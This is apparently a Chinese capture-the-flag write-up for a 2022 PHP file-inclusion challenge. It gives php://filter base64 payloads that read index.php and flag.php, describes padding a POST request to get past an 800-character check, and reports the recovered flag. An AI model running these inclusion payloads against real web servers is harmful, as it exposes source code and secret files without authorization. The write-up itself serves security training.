[鹏城杯 2022]简单包含 print的WriteUp

![](Aspose.Words.6c1175c6-12c3-4a9b-8ff1-32e9662da2de.001.png)

发现post上传和include文件包含

Playload：php://filter/read=convert.base64-encode/resource=index.php得到

![](Aspose.Words.6c1175c6-12c3-4a9b-8ff1-32e9662da2de.002.png)

解码发现不是flag

![](Aspose.Words.6c1175c6-12c3-4a9b-8ff1-32e9662da2de.003.png)

审计一下发现有一个post,还有一个判断小于800那么构造一个有800个字符的请求

Payload：&flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php

![](Aspose.Words.6c1175c6-12c3-4a9b-8ff1-32e9662da2de.004.png)

假b64得NSSCTF{981137b8-4019-4147-b56d-afb2bf1ac2e5}
